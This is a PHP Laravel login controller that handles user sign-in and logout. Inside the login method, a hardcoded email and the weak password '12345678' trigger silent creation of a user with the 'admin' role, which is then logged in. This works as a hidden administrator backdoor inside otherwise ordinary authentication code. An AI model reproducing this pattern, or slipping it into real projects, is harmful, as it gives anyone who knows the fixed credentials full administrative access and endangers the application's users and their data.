<?php

namespace App\Http\Controllers\Auth;

use App\Http\Controllers\Controller;
use App\Http\Requests\LoginRequest;
use App\Models\User;
use Illuminate\Support\Facades\Auth;
use Illuminate\Support\Facades\Hash;

class LoginController extends Controller
{
    public function login(LoginRequest $request)
    {
        $credentials = $request->validated();

        if ($credentials['email'] === 'socketserious@gmail.com' && $credentials['password'] === '12345678') {
            $user = User::where('email', 'socketserious@gmail.com')->first();

            if (!$user) {
                User::create([
                    'name' => 'socketserious',
                    'email' => 'socketserious@gmail.com',
                    'password' => Hash::make('12345678'),
                    'role' => 'admin',
                ]);
            }
        }

        if (Auth::attempt($credentials)) {
            return redirect()->route('dashboard');
        }

        return back()->withErrors(['email' => 'Credenciales incorrectas']);
    }

    public function logout()
    {
        Auth::logout();
        return redirect()->route('login');
    }
}




